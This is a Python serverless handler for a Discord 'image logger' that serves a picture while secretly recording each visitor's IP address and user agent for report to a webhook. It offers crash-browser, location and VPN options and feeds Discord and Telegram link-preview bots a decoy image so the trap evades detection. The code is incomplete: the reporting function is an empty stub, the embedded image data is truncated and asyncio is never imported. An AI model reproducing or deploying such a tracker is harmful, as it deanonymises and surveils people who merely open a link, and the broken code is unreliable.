import aiohttp
import base64
import httpagentparser
import logging
import json
from urllib import parse

logger = logging.getLogger(__name__)

config = {
    "webhook": "YOUR_DISCORD_WEBHOOK_URL",
    "image": "https://thf.bing.com/th/id/OIP.8XIzIku5qqZVbMy2CBgGhgHaDh?o=7&cb=thfc1rm=3&rs=1&pid=ImgDetMain&o=7&rm=3",
    "imageArgument": True,
    "username": "Enhanced Image Logger",
    "color": 0xff0000,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {"doMessage": False, "message": "This is an Enhanced Image Test", "richMessage": True},
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 0,
    "redirect": {"redirect": False, "page": "https://your-link.here"}
}

blacklistedIPs = ("27", "104", "143", "164")
binaries = {
    "loading": base64.b85decode(b'|JeWF01!...')  # Use the same loading image data
}

async def bot_check(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

async def make_report(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    # Same make_report function as in the original script
    pass  # Replace with the full make_report function from the enhanced script

async def main(request):
    try:
        headers = request["headers"]
        ip = headers.get("x-forwarded-for", "Unknown")
        useragent = headers.get("user-agent", "")
        path = request.get("path", "/api/image")
        query = parse.urlsplit(path).query
        dic = dict(parse.parse_qsl(query))

        url = config["image"]
        if config["imageArgument"] and (dic.get("url") or dic.get("id")):
            url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()

        if ip.startswith(blacklistedIPs):
            return {"statusCode": 403, "body": "Forbidden"}

        bot = await bot_check(ip, useragent)
        if bot:
            if config["buggedImage"]:
                return {
                    "statusCode": 200,
                    "headers": {"Content-Type": "image/jpeg"},
                    "body": binaries["loading"],
                    "isBase64Encoded": True
                }
            else:
                return {"statusCode": 302, "headers": {"Location": url}}

        await make_report(ip, useragent, dic.get("g") if config["accurateLocation"] else None, path.split("?")[0], url)

        data = f'''<style>body {{margin: 0; padding: 0;}}
        div.img {{background-image: url('{url}'); background-position: center center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh;}}</style><div class="img"></div>'''.encode()

        return {
            "statusCode": 200,
            "headers": {"Content-Type": "text/html"},
            "body": base64.b64encode(data).decode(),
            "isBase64Encoded": True
        }
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        return {
            "statusCode": 500,
            "headers": {"Content-Type": "text/html"},
            "body": "500 - Internal Server Error"
        }

def handler(event, context):
    return asyncio.run(main(event))
